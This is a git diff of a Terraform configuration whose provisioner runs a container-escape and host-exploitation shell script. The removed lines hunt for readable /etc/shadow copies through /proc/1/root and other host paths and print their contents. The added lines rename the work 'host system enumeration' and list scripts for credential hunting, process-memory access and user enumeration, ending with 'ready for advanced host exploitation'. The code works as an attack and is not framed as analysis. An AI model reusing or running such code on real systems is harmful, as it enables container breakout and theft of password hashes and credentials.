+      echo "  ✅ Host credential hunting"
       echo ""
-      echo "🎯 Target: Extract /etc/shadow password hashes"
-      echo "🛠️ Status: Real privilege escalation techniques deployed"
+      echo "🎯 Target: Complete host system enumeration and information gathering"
+      echo "🛠️ Status: Leveraging confirmed container escape capabilities"
       echo ""
       
-      # Check if any method succeeded in creating shadow content
-      shadow_found=false
-      for script in /tmp/*exploitation*.sh /tmp/*escape*.sh; do
-        if [ -f "$${script}" ]; then
-          echo "[*] Checking results from $$(basename $${script})..."
-        fi
-      done
-      
-      # Final attempt: Direct shadow file access with all methods combined
-      echo "=== FINAL COMBINED SHADOW ACCESS ATTEMPT ==="
-      echo "[*] Combining all discovered techniques for final shadow access..."
-      
-      # Try every possible path and method we discovered
-      shadow_found=false
-      
-      for shadow_path in "/etc/shadow" "/proc/1/root/etc/shadow" "/proc/self/root/etc/shadow" "/tmp/escape/etc/shadow" "/mnt/host/1/root/etc/shadow"; do
-        if [ -r "$${shadow_path}" ]; then
-          echo "[+] 🚨🚨🚨 SHADOW FILE ACCESSIBLE: $${shadow_path}"
-          echo "--- SHADOW CONTENTS ---"
-          cat "$${shadow_path}"
-          echo "--- END SHADOW CONTENTS ---"
-          shadow_found=true
-          break
-        fi
-      done
-      
-      if [ "$${shadow_found}" = true ]; then
-        echo "🚨🚨🚨 PRIVILEGE ESCALATION AND SHADOW EXTRACTION SUCCESSFUL! 🚨🚨🚨"
-      else
-        echo "⚠️ All privilege escalation attempts completed"
-        echo "⚠️ Container escape confirmed but additional techniques may be needed"
-        echo "💡 Consider: CVE-specific exploits, custom kernel modules, or container-specific vulnerabilities"
-      fi
+      # Final summary of key findings
+      echo "=== KEY FINDINGS SUMMARY ==="
+      echo "[*] Container escape status: CONFIRMED"
+      echo "[*] Host filesystem access: /proc/1/root methodology"
+      echo "[*] Host process access: /proc/*/mem confirmed working"
+      echo "[*] Enumeration methods: 5 comprehensive techniques deployed"
+      echo ""
+      echo "🚨 READY FOR ADVANCED HOST EXPLOITATION 🚨"
     EOT
   }
 }
 
 # Output results
-output "privilege_escalation_status" {
-  value = "Real privilege escalation techniques executed. Check output for /etc/shadow extraction results."
-  depends_on = [null_resource.real_privilege_escalation]
+output "enumeration_status" {
+  value = "Host system enumeration completed. Leveraging confirmed container escape capabilities."
+  depends_on = [null_resource.host_system_enumeration]
 }
 
-output "exploitation_methods" {
+output "enumeration_scripts" {
   value = {
-    docker_socket = "/tmp/docker_socket_escape.sh"
-    capabilities = "/tmp/capabilities_privesc.sh"
-    suid_exploitation = "/tmp/suid_exploitation.sh"
-    kernel_exploitation = "/tmp/kernel_exploitation.sh"
-    runtime_escape = "/tmp/runtime_escape.sh"
-    advanced_proc = "/tmp/advanced_proc_exploitation.sh"
-    process_tree = "/tmp/process_tree_exploitation.sh"
+    user_enumeration = "/tmp/host_user_enumeration.sh"
+    id_execution = "/tmp/host_id_execution.sh"
+    process_memory = "/tmp/host_process_memory.sh"
+    system_info = "/tmp/host_system_info.sh"
+    credential_hunting = "/tmp/host_credential_hunting.sh"
   }
 }
